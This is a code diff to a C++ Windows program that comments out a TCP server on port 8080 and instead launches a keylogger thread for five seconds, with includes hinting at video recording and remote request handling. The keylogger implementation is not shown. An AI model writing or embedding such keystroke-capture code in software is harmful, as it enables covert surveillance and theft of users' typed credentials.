@@ -4,6 +4,8 @@
 
 #include <vector>
 #include <string>
+
+#include "Keylogger.hpp"
 #include "RequestHandler.hpp"
 
 #include "VideoRecording.hpp"
@@ -35,73 +37,75 @@ int main(int argc, char *argv[])
 	}
 
 
-    const SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (serverSocket == INVALID_SOCKET)
-    {
-        std::cerr << "Cannot create socket" << '\n';
-        WSACleanup();
-        return 1;
-    }
-
-    sockaddr_in serverAddr{};
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
-    serverAddr.sin_port = htons(8080);
-
-    if (bind(serverSocket, reinterpret_cast<sockaddr *>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR)
-    {
-        std::cerr << "Bind failed!" << std::endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 1;
-    }
-
-
-    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
-        std::cerr << "Listen failed!" << std::endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 1;
-    }
-    std::cout << "Server is listening on port 8080..." << std::endl;
-
-    std::vector<HANDLE> clients;
-    int idx = 0;
-    while (true)
-    {
-	    RequestHandler requestHandler;
-	    sockaddr_in clientAddr{};
-        int clientSize = sizeof(clientAddr);
-        const SOCKET clientSocket = accept(serverSocket, reinterpret_cast<sockaddr *>(&clientAddr), &clientSize);
-        if (clientSocket == INVALID_SOCKET)
-        {
-            continue;
-        }
-        HANDLE client_thread = CreateThread(
-            nullptr,
-            0,
-            LPTHREAD_START_ROUTINE(&requestHandler.ProcessClient),
-            reinterpret_cast<LPVOID>(clientSocket),
-            0,
-            nullptr
-        );
-
-        if (client_thread == nullptr)
-        {
-            closesocket(clientSocket);
-            break;
-        }
-
-        clients.push_back(client_thread);
-        idx++;
-    }
-
-
-    for (HANDLE h : clients)
-    {
-        CloseHandle(h);
-    }
-    closesocket(serverSocket);
+    // const SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+    // if (serverSocket == INVALID_SOCKET)
+    // {
+    //     std::cerr << "Cannot create socket" << '\n';
+    //     WSACleanup();
+    //     return 1;
+    // }
+    //
+    // sockaddr_in serverAddr{};
+    // serverAddr.sin_family = AF_INET;
+    // serverAddr.sin_addr.s_addr = INADDR_ANY;
+    // serverAddr.sin_port = htons(8080);
+    //
+    // if (bind(serverSocket, reinterpret_cast<sockaddr *>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR)
+    // {
+    //     std::cerr << "Bind failed!" << std::endl;
+    //     closesocket(serverSocket);
+    //     WSACleanup();
+    //     return 1;
+    // }
+    //
+    //
+    // if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
+    //     std::cerr << "Listen failed!" << std::endl;
+    //     closesocket(serverSocket);
+    //     WSACleanup();
+    //     return 1;
+    // }
+    // std::cout << "Server is listening on port 8080..." << std::endl;
+    //
+    // std::vector<HANDLE> clients;
+    // int idx = 0;
+    // while (true)
+    // {
+	   //  RequestHandler requestHandler;
+	   //  sockaddr_in clientAddr{};
+    //     int clientSize = sizeof(clientAddr);
+    //     const SOCKET clientSocket = accept(serverSocket, reinterpret_cast<sockaddr *>(&clientAddr), &clientSize);
+    //     if (clientSocket == INVALID_SOCKET)
+    //     {
+    //         continue;
+    //     }
+    //     HANDLE client_thread = CreateThread(
+    //         nullptr,
+    //         0,
+    //         LPTHREAD_START_ROUTINE(&requestHandler.ProcessClient),
+    //         reinterpret_cast<LPVOID>(clientSocket),
+    //         0,
+    //         nullptr
+    //     );
+    //
+    //     if (client_thread == nullptr)
+    //     {
+    //         closesocket(clientSocket);
+    //         break;
+    //     }
+    //
+    //     clients.push_back(client_thread);
+    //     idx++;
+    // }
+    // for (HANDLE h : clients)
+    // {
+    //     CloseHandle(h);
+    // }
+	CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Keylogger::SKeylogger), nullptr, 0, &Keylogger::dwThreadID);
+    // RequestHandler::cleanup();
+    // closesocket(serverSocket);
+	Sleep(5000);
+	Keylogger::StopKeylogger();
     WSACleanup();
 	MFShutdown();
 	CoUninitialize();
